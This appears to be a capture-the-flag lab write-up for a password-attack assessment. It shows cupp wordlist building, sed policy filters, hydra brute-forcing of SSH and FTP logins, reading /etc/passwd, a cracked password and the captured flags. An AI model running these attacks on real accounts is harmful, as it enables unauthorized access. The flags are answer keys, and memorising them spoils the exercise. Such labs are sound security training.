# Skills Assessment

## Questions

As you now have the name of an employee, try to gather basic information about them, and generate a custom password wordlist that meets the password policy. Also use 'usernameGenerator' to generate potential usernames for the employee. Finally, try to brute force the SSH server shown above to get the flag.
```
Commands:

# Generate username wordlist
bash usernameGenerator.sh Harry Potter

# Create password
cupp -i

# Removing things
Must be 8 characters or longer
sed -ri '/^.{,7}$/d' harry.txt

Must contain numbers
sed -ri '/[0-9]+/!d' harry.txt

Must contain special characters
sed -ri '/[!-/:-@\[-`\{-~]+/!d' harry.txt

# Try attacking
hydra -l william.txt -P rockyou.txt 46.101.23.188 -s 31990 -t 4 ssh

Flag:
HTB{4lw4y5_u53_r4nd0m_p455w0rd_63n3r470r}

```

Once you are in, you should find that another user exists in server. Try to brute force their login, and get their flag.

```

Commands:

# Find other users (ginny)
cat /etc/passwd

Result:
harry.potter:x:1000:1000::/home/harry.potter:/bin/bash
g.potter:x:1001:1001::/home/g.potter:/bin/bash

# Brute force into account
hydra -l g.potter -P rockyou-30.txt ftp://127.0.0.1

Result:
[DATA] max 16 tasks per 1 server, overall 16 tasks, 1556 login tries (l:1/p:1556), ~98 tries per task
[DATA] attacking ftp://127.0.0.1:21/
[STATUS] 274.00 tries/min, 274 tries in 00:01h, 1282 to do in 00:05h, 16 active
[STATUS] 282.67 tries/min, 848 tries in 00:03h, 708 to do in 00:03h, 16 active
[21][ftp] host: 127.0.0.1   login: g.potter   password: harry
1 of 1 target successfully completed, 1 valid password found

# Trying to connect
su - g.potter

Flag:
HTB{1_50l3mnly_5w34r_7h47_1_w1ll_u53_r4nd0m_p455w0rd5}

```
